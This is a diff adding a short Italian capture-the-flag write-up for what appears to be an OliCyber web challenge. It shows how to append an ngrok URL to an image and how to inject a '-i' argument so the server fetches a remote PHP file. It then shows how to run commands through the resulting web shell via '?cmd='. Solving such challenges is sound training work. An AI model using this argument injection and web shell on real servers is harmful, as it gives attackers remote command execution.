@@ -1,0 +1,8 @@
+Usare un immagine a caso e mettergli alla fine l'url di ngrok con il link a sol.php:
+    $ echo "https://....ngrok-free.app/sol.php" >> image.jpg
+
+Inviare come immagine:
+    -iNGROK_URL/image.jpg
+
+Usare la shell tramite il link:
+    http://maledettabiondi.challs.olicyber.it/uploads/TUO_ID/sol.php/?cmd=COMANDO
